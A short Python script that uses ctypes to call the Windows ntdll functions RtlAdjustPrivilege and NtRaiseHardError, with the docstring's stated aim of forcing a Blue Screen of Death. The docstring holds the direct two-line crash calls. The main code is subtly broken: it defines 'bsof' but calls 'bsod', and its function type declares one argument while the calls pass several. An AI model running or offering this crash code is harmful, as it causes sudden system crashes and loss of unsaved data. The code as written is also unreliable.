import ctypes
from ctypes import wintypes

'''
Objective:
Create a function pointer to call the BSoD function in python

Ref:
ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

https://www.geeksforgeeks.org/turning-a-function-pointer-to-callable/
'''

ntdll = ctypes.windll.LoadLibrary('ntdll')
priv = ctypes.cast(ntdll.RtlAdjustPrivilege, ctypes.c_void_p).value
bsof = ctypes.cast(ntdll.NtRaiseHardError, ctypes.c_void_p).value
#print("priv mem addr: ", priv)
#print("\nBSoD mem addr: ", BSoD)


functype = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int)
#print("\nFunction: ", functype)

state = ctypes.c_bool
size = ctypes.wintypes.DWORD

deepstate = ctypes.byref(state())
dwsize = ctypes.byref(size())

AdjustPriv = functype(priv)
RaiseError = functype(bsod)

AdjustPriv(19, 1, 0, deepstate)
RaiseError(0xc0000022, 0, 0, 0, 6, dwsize)
